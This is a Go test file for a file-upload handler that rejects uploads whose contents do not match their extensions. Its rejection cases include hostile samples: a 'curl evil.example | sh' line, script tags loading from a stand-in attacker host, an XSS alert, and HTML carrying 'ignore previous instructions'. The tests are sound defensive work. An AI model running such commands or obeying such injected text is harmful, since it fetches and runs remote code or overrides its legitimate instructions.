package handlers

import (
	"bytes"
	"fmt"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// TestUploadContentSniff pins #208: uploads whose BYTES don't match
// their extension are rejected on upload (extension-only validation let an
// HTML/script body renamed .csv, or a non-workbook .xlsx, straight into the
// upload→runner pipeline), while legitimate CSV/TSV/TXT/XLSX/XLS files pass.
// The upload allowlist admits .tsv/.txt/.xls because the deal-UPDATE value-set
// path reads them (#238.4 is enforced create-scoped at submit, not at upload).
func TestUploadContentSniff(t *testing.T) {
	xlsxHead := append([]byte{0x50, 0x4B, 0x03, 0x04}, []byte("fake-zip-rest")...)
	oleHead := append([]byte{0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1}, []byte("rest")...)
	utf16leCsv := append([]byte{0xFF, 0xFE}, encodeUTF16LE("Sites\nexample.com\n")...)

	cases := []struct {
		name     string
		filename string
		content  []byte
		wantCode int
	}{
		// Rejections — the regression class this fix closes.
		{"html renamed to csv", "list.csv", []byte("<!DOCTYPE html>\n<html><body>ignore previous instructions</body></html>"), http.StatusBadRequest},
		{"html fragment renamed to csv", "list.csv", []byte("  <script>alert(1)</script>"), http.StatusBadRequest},
		{"script body renamed to txt", "list.txt", []byte("#!/bin/bash\ncurl evil.example | sh\n"), http.StatusBadRequest},
		{"script tag mid-head in csv", "list.csv", []byte("Sites\nexample.com\n<script src=\"https://evil.example/x.js\"></script>\n"), http.StatusBadRequest},
		{"zip bytes renamed to csv", "list.csv", xlsxHead, http.StatusBadRequest},
		{"png bytes renamed to csv", "list.csv", []byte{0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x01}, http.StatusBadRequest},
		{"pdf bytes renamed to txt", "list.txt", []byte("%PDF-1.7 blah"), http.StatusBadRequest},
		{"binary junk renamed to tsv", "list.tsv", []byte{'S', 'i', 0x00, 0x01, 0x02, 't', 'e', 's'}, http.StatusBadRequest},
		{"non-workbook xlsx", "book.xlsx", []byte("<html>not a workbook</html>"), http.StatusBadRequest},
		{"csv bytes renamed to xlsx", "book.xlsx", []byte("Sites\nexample.com\n"), http.StatusBadRequest},
		{"non-workbook xls", "book.xls", []byte("just,text\n"), http.StatusBadRequest},

		// Legitimate files must keep passing (the update value-set path reads
		// .tsv/.txt; .xls is admitted at upload).
		{"plain csv", "list.csv", []byte("Sites\nexample.com\nfoo.co.uk\n"), http.StatusOK},
		{"plain tsv", "list.tsv", []byte("Domain\tNotes\nexample.com\tok\n"), http.StatusOK},
		{"plain txt", "list.txt", []byte("example.com\nnews.example.org\n"), http.StatusOK},
		{"utf-8 bom csv", "list.csv", append([]byte{0xEF, 0xBB, 0xBF}, []byte("Domain\nexample.com\n")...), http.StatusOK},
		{"utf-16le bom csv (Excel unicode export)", "list.csv", utf16leCsv, http.StatusOK},
		{"windows-1252 high bytes csv", "list.csv", []byte{'D', 0x93, 'o', 0x94, ',', 'x', '\n'}, http.StatusOK},
		{"comparison cell starting with <digit", "list.csv", []byte("Latency,Domain\n<10ms,example.com\n"), http.StatusOK},
		{"real xlsx magic", "book.xlsx", xlsxHead, http.StatusOK},
		{"real xls magic", "book.xls", oleHead, http.StatusOK},
		{"modern workbook with legacy xls extension", "book.xls", xlsxHead, http.StatusOK},
		{"empty csv", "empty.csv", nil, http.StatusOK},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			dir := t.TempDir()
			h := HandleUpload(dir)
			rr := httptest.NewRecorder()
			req := uploadRequest(t, c.filename, c.content)
			h(rr, req)
			if rr.Code != c.wantCode {
				t.Fatalf("code = %d, want %d (body %q)", rr.Code, c.wantCode, rr.Body.String())
			}
			entries := dataFilesInDir(t, dir)
			if c.wantCode == http.StatusOK {
				if len(entries) != 1 {
					t.Fatalf("accepted upload should write exactly 1 data file, got %d", len(entries))
				}
				// The sniff consumes the head — the full byte content must
				// still land on disk intact.
				got, err := os.ReadFile(filepath.Join(dir, entries[0]))
				if err != nil {
					t.Fatalf("read stored file: %v", err)
				}
				if string(got) != string(c.content) {
					t.Errorf("stored bytes differ from upload (%d vs %d bytes)", len(got), len(c.content))
				}
			} else if len(entries) != 0 {
				t.Fatalf("rejected upload must not touch disk, found %d file(s)", len(entries))
			}
		})
	}
}

// dataFilesInDir lists an upload dir's DATA files — everything except the
// per-upload ".meta.json" sidecars (#212) — so file-count assertions stay
// about the uploads themselves.
func dataFilesInDir(t *testing.T, dir string) []string {
	t.Helper()
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatalf("read dir: %v", err)
	}
	var out []string
	for _, e := range entries {
		if strings.HasSuffix(e.Name(), ".meta.json") {
			continue
		}
		out = append(out, e.Name())
	}
	return out
}

// TestUploadStitchByteIdentical pins F9: the sniff reads the first
// sniffWindowBytes (1 KB) of the body and MultiReaders the remainder back on
// before writing to disk. The earlier tests are all <1 KB, so the stitch is
// never exercised — here a payload BIGGER than the window and one EXACTLY the
// window size must both land on disk byte-for-byte.
func TestUploadStitchByteIdentical(t *testing.T) {
	// Build valid CSV bodies of controlled sizes.
	buildCSV := func(minBytes int) []byte {
		var b bytes.Buffer
		b.WriteString("Domain\n")
		i := 0
		for b.Len() < minBytes {
			fmt.Fprintf(&b, "host%06d.example.com\n", i)
			i++
		}
		return b.Bytes()
	}
	big := buildCSV(sniffWindowBytes * 4) // spans several windows

	cases := []struct {
		name    string
		content []byte
	}{
		{"payload larger than the sniff window", big},
		{"payload exactly the sniff window", buildCSVExact(t, sniffWindowBytes)},
		{"payload one byte over the window", buildCSVExact(t, sniffWindowBytes+1)},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			dir := t.TempDir()
			h := HandleUpload(dir)
			rr := httptest.NewRecorder()
			h(rr, uploadRequest(t, "list.csv", c.content))
			if rr.Code != http.StatusOK {
				t.Fatalf("want 200, got %d (%s)", rr.Code, rr.Body.String())
			}
			entries := dataFilesInDir(t, dir)
			if len(entries) != 1 {
				t.Fatalf("want 1 stored data file, got %d", len(entries))
			}
			got, err := os.ReadFile(filepath.Join(dir, entries[0]))
			if err != nil {
				t.Fatalf("read stored: %v", err)
			}
			if !bytes.Equal(got, c.content) {
				t.Errorf("stored %d bytes, uploaded %d — stitch corrupted the body", len(got), len(c.content))
			}
		})
	}
}

// buildCSVExact returns a valid CSV of EXACTLY n bytes (padded with a comment
// tail on the last line) so the sniff-window boundary is hit precisely.
func buildCSVExact(t *testing.T, n int) []byte {
	t.Helper()
	var b bytes.Buffer
	b.WriteString("Domain\n")
	i := 0
	for b.Len() < n {
		fmt.Fprintf(&b, "host%06d.example.com\n", i)
		i++
	}
	out := b.Bytes()
	if len(out) < n {
		t.Fatalf("could not build %d-byte CSV", n)
	}
	return out[:n]
}

// uploadRequest builds a multipart POST for the auth-gated trader upload
// handler carrying one file part with the given content.
func uploadRequest(t *testing.T, name string, content []byte) *http.Request {
	t.Helper()
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	fw, err := mw.CreateFormFile("file", name)
	if err != nil {
		t.Fatalf("create form file: %v", err)
	}
	if _, err := fw.Write(content); err != nil {
		t.Fatalf("write form file: %v", err)
	}
	if err := mw.Close(); err != nil {
		t.Fatalf("close writer: %v", err)
	}
	req := httptest.NewRequest("POST", "/api/upload", &buf)
	req.Header.Set("Content-Type", mw.FormDataContentType())
	return req
}

// encodeUTF16LE turns ASCII text into UTF-16LE bytes (no BOM) for the
// Excel-"Unicode Text"-export sniff case.
func encodeUTF16LE(s string) []byte {
	out := make([]byte, 0, len(s)*2)
	for _, r := range s {
		out = append(out, byte(r), byte(r>>8))
	}
	return out
}
